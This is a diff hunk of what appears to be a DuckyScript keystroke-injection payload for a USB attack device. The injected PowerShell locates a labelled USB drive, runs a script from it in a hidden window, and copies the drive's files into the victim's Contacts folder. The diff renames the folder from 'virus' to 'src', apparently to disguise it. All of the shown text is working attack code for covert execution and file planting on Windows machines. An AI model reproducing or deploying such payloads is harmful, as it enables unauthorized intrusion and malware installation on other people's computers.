@@ -67,13 +67,13 @@ LEFT
 ENTER
 END_REM
 DELAY 1000
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {cd $driveLetter\virus}
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {cd $driveLetter\src}
 DELAY 200
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Start-Process powershell -ArgumentList "$driveletter\virus\event.ps1" -WindowStyle Hidden}
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Start-Process powershell -ArgumentList "$driveletter\src\event.ps1" -WindowStyle Hidden}
 DELAY 200
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {New-Item -Path "c:\Users\$env:USERNAME\Contacts" -Name 'virus' -ItemType "directory"}
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {New-Item -Path "c:\Users\$env:USERNAME\Contacts" -Name 'src' -ItemType "directory"}
 DELAY 200
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Copy-Item -Path "$driveLetter\virus\*" -Destination "C:\Users\$env:USERNAME\Contacts\virus"}
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Copy-Item -Path "$driveLetter\src\*" -Destination "C:\Users\$env:USERNAME\Contacts\src"}
 DELAY 1000
 STRINGLN exit
 DELAY 250
